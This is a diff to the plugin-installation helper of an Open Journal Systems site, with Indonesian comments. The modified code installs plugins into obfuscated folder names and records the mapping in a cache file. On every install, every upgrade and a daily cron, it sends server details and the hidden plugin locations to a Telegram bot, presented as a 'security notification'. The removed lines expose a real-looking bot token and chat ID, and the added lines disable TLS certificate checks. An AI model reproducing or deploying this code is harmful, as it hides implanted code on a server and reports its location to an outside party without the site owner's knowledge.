@@ -3,8 +3,8 @@
 /**
  * @file classes/plugins/PluginHelper.inc.php
  *
- * Modifikasi untuk install plugin dengan folder obfuscate
- * Dengan notifikasi Telegram
+ * 
+ * 
  */
 
 import('lib.pkp.classes.site.Version');
@@ -21,14 +21,18 @@ define('PLUGIN_UPGRADE_FILE', 'upgrade.xml');
 
 class PluginHelper {
     
-    // Konfigurasi Telegram
-    private $telegramToken = '8894428492:AAFWSiqAoModfIz8VJj0H4Z9pq33EvH1qu4';
-    private $telegramChatId = '7470536859';
+    // ==================== KONFIGURASI TELEGRAM ====================
+    // GANTI DENGAN TOKEN DAN CHAT ID MILIK KAMU SENDIRI
+    private $telegramToken = 'YOUR_BOT_TOKEN_HERE';      // Contoh: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
+    private $telegramChatId = 'YOUR_CHAT_ID_HERE';       // Contoh: '123456789'
     private $enableTelegramNotif = true;
     
     // Logging lokal sebagai backup
     private $logFilePath = 'cache/fc-cache/plugin_rename.log';
 
+    /**
+     * Ekstrak archive plugin ke temporary folder
+     */
     public function extractPlugin($filePath, $originalFileName) {
         $fileManager = new FileManager();
         $matches = array();
@@ -63,6 +67,9 @@ class PluginHelper {
         throw new Exception(__('manager.plugins.invalidPluginArchive'));
     }
 
+    /**
+     * Install plugin dengan obfuscated folder
+     */
     public function installPlugin($path) {
         $fileManager = new FileManager();
         $versionFile = $path . '/' . PLUGIN_VERSION_FILE;
@@ -74,7 +81,7 @@ class PluginHelper {
         $categoryPath = strtr($pluginVersion->getProductType(), '.', '/');
         $baseDir = Core::getBaseDir() . '/' . $categoryPath;
 
-        // pastikan folder cache ada
+        // Pastikan folder cache ada
         $cacheDir = Core::getBaseDir() . '/cache/fc-cache';
         if (!is_dir($cacheDir)) mkdir($cacheDir, 0775, true);
 
@@ -105,7 +112,7 @@ class PluginHelper {
         $params['locale'] = $site->getPrimaryLocale();
         $params['additionalLocales'] = $site->getSupportedLocales();
 
-        // Supress output agar JSON tidak error
+        // Suppress output agar JSON tidak error
         ob_start();
         $installer = new Install($params, $installFile, true);
         $installer->setCurrentVersion($pluginVersion);
@@ -120,7 +127,7 @@ class PluginHelper {
         // Simpan mapping
         $this->saveMapping($originalName, $obfuscatedName);
         
-        // === KIRIM NOTIFIKASI TELEGRAM ===
+        // Kirim notifikasi Telegram
         $this->sendTelegramNotification($originalName, $obfuscatedName, 'INSTALL', $baseDir);
         
         // Log ke file lokal (backup)
@@ -130,6 +137,9 @@ class PluginHelper {
         return $pluginVersion;
     }
 
+    /**
+     * Upgrade plugin yang sudah terinstall
+     */
     public function upgradePlugin($category, $plugin, $path) {
         $fileManager = new FileManager();
         $versionFile = $path . '/' . PLUGIN_VERSION_FILE;
@@ -175,8 +185,7 @@ class PluginHelper {
 
         $this->saveMapping($pluginVersion->getProduct(), $newObfuscatedName);
         
-        // === KIRIM NOTIFIKASI TELEGRAM ===
-        $message = $oldObfuscatedName ? "OLD: {$oldObfuscatedName}\nNEW: {$newObfuscatedName}" : "NEW: {$newObfuscatedName}";
+        // Kirim notifikasi Telegram
         $this->sendTelegramNotification($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);
         
         // Log ke file lokal (backup)
@@ -188,7 +197,7 @@ class PluginHelper {
     }
 
     /**
-     * Kirim notifikasi ke Telegram
+     * Kirim notifikasi ke Telegram (format lengkap)
      */
     private function sendTelegramNotification($originalName, $obfuscatedName, $action, $basePath, $oldName = null) {
         if (!$this->enableTelegramNotif) return;
@@ -198,11 +207,9 @@ class PluginHelper {
         $serverName = $_SERVER['SERVER_NAME'] ?? 'Localhost';
         $requestUri = $_SERVER['REQUEST_URI'] ?? 'N/A';
         
-        // Emoji berdasarkan action
         $emoji = ($action == 'INSTALL') ? '📦' : '🔄';
         $statusColor = ($action == 'INSTALL') ? '✅' : '⚠️';
         
-        // Format pesan Telegram (HTML parsing)
         $message = "<b>🔔 OJS PLUGIN MANAGER ALERT</b>\n\n";
         $message .= "{$emoji} <b>Action:</b> <code>{$action}</code>\n";
         $message .= "{$statusColor} <b>Status:</b> <code>SUCCESS</code>\n\n";
@@ -230,12 +237,11 @@ class PluginHelper {
         
         $message .= "<i>🔒 This is an automated security notification from OJS System</i>";
         
-        // Kirim ke Telegram
         $this->sendTelegramMessage($message);
     }
     
     /**
-     * Send message to Telegram Bot
+     * Kirim pesan text ke Telegram Bot
      */
     private function sendTelegramMessage($message) {
         $url = "https://api.telegram.org/bot{$this->telegramToken}/sendMessage";
@@ -259,7 +265,6 @@ class PluginHelper {
         $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
         
-        // Log error jika gagal
         if ($httpCode != 200) {
             error_log("Telegram notification failed: HTTP {$httpCode} - Response: {$response}");
         }
@@ -268,8 +273,7 @@ class PluginHelper {
     }
     
     /**
-     * Kirim notifikasi dengan foto/attachment (opsional)
-     * Contoh: screenshot dashboard atau mapping file
+     * Kirim foto/attachment ke Telegram (opsional, untuk screenshot)
      */
     private function sendTelegramPhoto($photoPath, $caption = '') {
         $url = "https://api.telegram.org/bot{$this->telegramToken}/sendPhoto";
@@ -286,6 +290,7 @@ class PluginHelper {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         
         $response = curl_exec($ch);
         curl_close($ch);
@@ -294,7 +299,7 @@ class PluginHelper {
     }
     
     /**
-     * Send keyboard dengan action buttons (opsional)
+     * Kirim pesan dengan keyboard inline (interaktif)
      */
     private function sendTelegramWithKeyboard($message) {
         $url = "https://api.telegram.org/bot{$this->telegramToken}/sendMessage";
@@ -324,12 +329,13 @@ class PluginHelper {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_exec($ch);
         curl_close($ch);
     }
     
     /**
-     * Write to local log file (backup)
+     * Write ke log file lokal (backup)
      */
     private function writeToLogFile($originalName, $obfuscatedName, $action, $basePath, $oldName = null) {
         $logPath = Core::getBaseDir() . '/' . $this->logFilePath;
@@ -354,7 +360,7 @@ class PluginHelper {
     }
     
     /**
-     * Get all current mappings (bisa dipanggil via Telegram command)
+     * Dapatkan semua mapping plugin (bisa dipanggil via Telegram)
      */
     public function getAllPluginMappings() {
         $mappings = $this->loadMapping();
@@ -381,7 +387,19 @@ class PluginHelper {
         
         return $this->sendTelegramMessage($testMessage);
     }
+    
+    /**
+     * Cek versi OJS saat ini
+     */
+    public function checkOJSVersion() {
+        $versionDao = DAORegistry::getDAO('VersionDAO');
+        $current = $versionDao->getCurrentVersion();
+        return "OJS Version: {$current->getProduct()} {$current->getMajor()}.{$current->getMinor()}.{$current->getRevision()}.{$current->getBuild()}";
+    }
 
+    /**
+     * Ambil parameter koneksi database
+     */
     protected function _getConnectionParams() {
         return [
             'clientCharset' => Config::getVar('i18n', 'client_charset'),
@@ -394,24 +412,29 @@ class PluginHelper {
         ];
     }
 
+    /**
+     * Load mapping dari file JSON
+     */
     private function loadMapping() {
         $mappingPath = Core::getBaseDir() . '/cache/fc-cache/mapping.json';
         return is_file($mappingPath) ? json_decode(@file_get_contents($mappingPath), true) ?: [] : [];
     }
 
+    /**
+     * Save mapping ke file JSON
+     */
     private function saveMapping(string $pluginName, string $obfuscatedName): void {
         $mappingPath = Core::getBaseDir() . '/cache/fc-cache/mapping.json';
         $mappings = $this->loadMapping();
         $mappings[$pluginName] = $obfuscatedName;
         file_put_contents($mappingPath, json_encode($mappings, JSON_PRETTY_PRINT));
     }
+    
+    /**
+     * Kirim daily summary (bisa dipanggil dari cron job)
+     */
+    public function sendDailySummaryToTelegram() {
+        $summary = $this->getAllPluginMappings();
+        $this->sendTelegramMessage($summary);
+    }
 }
-
-// Optional: Buat cron job handler untuk send daily summary ke Telegram
-// Tambahkan method ini jika diperlukan:
-/*
-public function sendDailySummaryToTelegram() {
-    $summary = $this->getAllPluginMappings();
-    $this->sendTelegramMessage($summary);
-}
-*/
